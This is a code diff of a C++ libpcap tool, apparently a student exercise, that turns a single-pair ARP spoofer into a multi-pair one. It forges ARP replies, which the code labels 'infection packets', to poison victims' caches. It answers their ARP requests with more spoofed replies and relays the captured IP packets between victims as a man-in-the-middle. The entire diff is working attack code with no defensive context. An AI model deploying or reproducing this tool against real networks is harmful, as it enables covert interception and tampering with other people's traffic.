@@ -45,18 +45,18 @@ typedef  struct _type_eth_arp{
 
 typedef struct _type_ip{
     uint8_t h_len:4;
-        uint8_t ver:4;
-        uint8_t tos;
-        uint16_t total_len;
-        uint16_t idneti;
-        uint8_t off:5;
-        uint8_t flag:3;
-        uint8_t off_2;
-        uint8_t ttl;
-        uint8_t proto;
-        uint16_t checksum;
-        in_addr src_ip;
-        in_addr dst_ip;
+    uint8_t ver:4;
+    uint8_t tos;
+    uint16_t total_len;
+    uint16_t idneti;
+    uint8_t off:5;
+    uint8_t flag:3;
+    uint8_t off_2;
+    uint8_t ttl;
+    uint8_t proto;
+    uint16_t checksum;
+    in_addr src_ip;
+    in_addr dst_ip;
 }type_ip;
 
 bool get_my_mac(char* dev,uint8_t *a_mac){
@@ -92,6 +92,18 @@ bool is_request(type_arp *recv_arp, type_eth_arp infection_pkt){
     return false;
 }
 
+bool is_relay_stot(type_eth *recv_eth, type_ip *recv_ip, type_eth_arp infection_pkt){
+    if ((memcmp(recv_eth->src_mac,infection_pkt.e.dst_mac,MAC_LEN) == 0 ) && (recv_ip->src_ip.s_addr == infection_pkt.a.trgt_ip.s_addr))
+        return true;
+    return false;
+}
+
+bool is_relay_ttos(type_eth *recv_eth, type_ip *recv_ip, type_eth_arp infection_pkt){
+    if((memcmp(recv_eth->src_mac,infection_pkt.e.dst_mac,MAC_LEN) == 0 ) && (recv_ip->dst_ip.s_addr == infection_pkt.a.sndr_ip.s_addr))
+        return true;
+    return false;
+}
+
 void set_broadcast_packet(type_eth_arp *tmp, uint8_t *sndr_mac,in_addr sndr_ip,in_addr trgt_ip){
     memcpy(tmp->e.src_mac,sndr_mac,MAC_LEN);
     memset(tmp->e.dst_mac,0xff,MAC_LEN);
@@ -106,13 +118,18 @@ void set_broadcast_packet(type_eth_arp *tmp, uint8_t *sndr_mac,in_addr sndr_ip,i
     memset(tmp->a.trgt_mac,0x00,MAC_LEN);
     tmp->a.trgt_ip = trgt_ip;
 }
+void set_broadcast_packets(type_eth_arp *tmp, uint8_t *sndr_mac,in_addr sndr_ip,in_addr *trgt_ip, int cnt){
+    for (int i=0;i<cnt;i++) {
+        set_broadcast_packet(&tmp[i],sndr_mac,sndr_ip,trgt_ip[i]);
+    }
+}
 
 void time_error(int signo){
     printf("error : No Macs found for corresponding IP\n");
     exit(1);
 }
 
-void set_target_mac(pcap_t * handle, type_eth_arp *tmp){
+void get_mac(pcap_t * handle, type_eth_arp *tmp){
     struct sigaction act;
     act.sa_handler = time_error;
     sigemptyset(&act.sa_mask);
@@ -141,13 +158,34 @@ void set_target_mac(pcap_t * handle, type_eth_arp *tmp){
     }
 }
 
+void get_macs(pcap_t * handle, type_eth_arp *tmp, int cnt){
+    for (int i=0;i<cnt;i++) {
+        get_mac(handle,&tmp[i]);
+    }
+}
 void set_infection_packet(type_eth_arp *tmp, in_addr fake_ip){
     tmp->a.sndr_ip = fake_ip;
     tmp->a.op_code = htons(ARPOP_REPLY);
 }
+
+void set_infection_packets(type_eth_arp *tmp, in_addr *fake_ip, int cnt){
+    for (int i=0;i<cnt;i++) {
+        set_infection_packet(&tmp[i],fake_ip[i]);
+    }
+}
 void set_relay_packet(type_eth *tmp, uint8_t * src_mac ,uint8_t *dst_mac){
     memcpy(tmp->src_mac,src_mac,MAC_LEN);
     memcpy(tmp->dst_mac,dst_mac,MAC_LEN);
+}
+
+void send_infection_packets(pcap_t * handle, type_eth_arp *snd, type_eth_arp *trg, int cnt){
+    for (int i=0;i<cnt;i++) {
+        for (int j=0;j<3;j++) {
+            printf("send infection packet\n");
+            pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&snd[i]), sizeof (type_eth_arp));
+            pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&trg[i]), sizeof (type_eth_arp));
+        }
+    }
 }
 
 void usage() {
@@ -167,11 +205,20 @@ int main(int argc, char* argv[]) {
         fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
         return -1;
     }
+
     uint8_t my_mac[MAC_LEN];
-    in_addr my_ip, sender_ip, target_ip;
-    inet_aton(argv[2],&sender_ip);
-    inet_aton(argv[3],&target_ip);
-    type_eth_arp sender_packet, target_packet;
+    in_addr my_ip;
+    int flow_cnt = (argc-2)/2;
+    int i=0;
+    in_addr *sender_ip = new in_addr[flow_cnt];
+    in_addr *target_ip = new in_addr[flow_cnt];
+    for (int i=1;i<=flow_cnt;i++) {
+        inet_aton(argv[2*i],&sender_ip[i-1]);
+        inet_aton(argv[2*i+1],&target_ip[i-1]);
+    }
+
+    type_eth_arp *sender_packet = new type_eth_arp[flow_cnt];
+    type_eth_arp *target_packet = new type_eth_arp[flow_cnt];
 
     if (get_my_mac(dev, my_mac) == false){
         printf("error : mac_address can't be imported\n");
@@ -181,20 +228,13 @@ int main(int argc, char* argv[]) {
         printf("error : ip_address can't be imported\n");
         return -1;
     }
-    
-    set_broadcast_packet(&sender_packet,my_mac,my_ip,sender_ip);
-    set_broadcast_packet(&target_packet,my_mac,my_ip,target_ip);
-    set_target_mac(handle,&sender_packet);
-    set_target_mac(handle,&target_packet);
-
-    set_infection_packet(&sender_packet,target_ip);
-    set_infection_packet(&target_packet,sender_ip);
-    printf("Send infection packet!\n");
-
-    for (int i=0;i<3;i++) {
-        pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&sender_packet), sizeof (type_eth_arp));
-        pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&target_packet), sizeof (type_eth_arp));
-    }
+    set_broadcast_packets(sender_packet,my_mac,my_ip,sender_ip,flow_cnt);
+    set_broadcast_packets(target_packet,my_mac,my_ip,target_ip,flow_cnt);
+    get_macs(handle,sender_packet,flow_cnt);
+    get_macs(handle,target_packet,flow_cnt);
+    set_infection_packets(sender_packet,target_ip,flow_cnt);
+    set_infection_packets(target_packet,sender_ip,flow_cnt);
+    send_infection_packets(handle, sender_packet, target_packet, flow_cnt);
 
     while (true) {
         struct pcap_pkthdr* header;
@@ -210,28 +250,40 @@ int main(int argc, char* argv[]) {
             continue;
         if(ntohs(eth->type) == ETHERTYPE_ARP){
             type_arp *arp = reinterpret_cast<type_arp *>(const_cast<u_char *>(packet+sizeof (type_eth)));
-            if(is_request(arp,sender_packet)){
-                printf("send reply packet\n");
-                pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&sender_packet), sizeof (type_eth_arp));
-            }
-            else if(is_request(arp,target_packet)){
-                printf("send reply packet\n");
-                pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&target_packet), sizeof (type_eth_arp));
+            for (i=0;i<flow_cnt;i++) {
+                if(is_request(arp,sender_packet[i])){
+                    printf("send reply packet to sender\n");
+                    pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&sender_packet[i]), sizeof (type_eth_arp));
+                    continue;
+                }
+                if(is_request(arp,target_packet[i])){
+                    printf("send reply packet to target\n");
+                    pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&target_packet[i]), sizeof (type_eth_arp));
+                    continue;
+                }
             }
         }
         else if(ntohs(eth->type) == ETHERTYPE_IP){
             type_ip *ip = reinterpret_cast<type_ip *>(const_cast<u_char *>(packet + sizeof (type_eth)));
-            if (memcmp(eth->src_mac,sender_packet.e.dst_mac,MAC_LEN) == 0  && (ip->src_ip.s_addr == sender_packet.a.trgt_ip.s_addr)){
-                printf("send sender to target relay packet\n");
-                set_relay_packet(eth,sender_packet.e.src_mac,target_packet.e.dst_mac);
-                pcap_sendpacket(handle,packet,int(header->len));
-            }
-            else if(memcmp(eth->src_mac,target_packet.e.dst_mac,MAC_LEN) == 0  && (ip->dst_ip.s_addr == target_packet.a.sndr_ip.s_addr)){
-                printf("send target to sender relay packet\n");
-                set_relay_packet(eth,target_packet.e.src_mac,sender_packet.e.dst_mac);
-                pcap_sendpacket(handle,packet,int(header->len));
+            for (i=0;i<flow_cnt;i++) {
+                if (is_relay_stot(eth,ip,sender_packet[i])){
+                    printf("send sender to target relay packet\n");
+                    set_relay_packet(eth,sender_packet[i].e.src_mac,target_packet[i].e.dst_mac);
+                    pcap_sendpacket(handle,packet,int(header->len));
+                    continue;
+                }
+                if(is_relay_ttos(eth,ip,target_packet[i])){
+                    printf("send target to sender relay packet\n");
+                    set_relay_packet(eth,target_packet[i].e.src_mac,sender_packet[i].e.dst_mac);
+                    pcap_sendpacket(handle,packet,int(header->len));
+                    continue;
+                }
             }
         }
     }
+    delete [] sender_ip;
+    delete [] target_ip;
+    delete [] sender_packet;
+    delete [] target_packet;
     pcap_close(handle);
 }
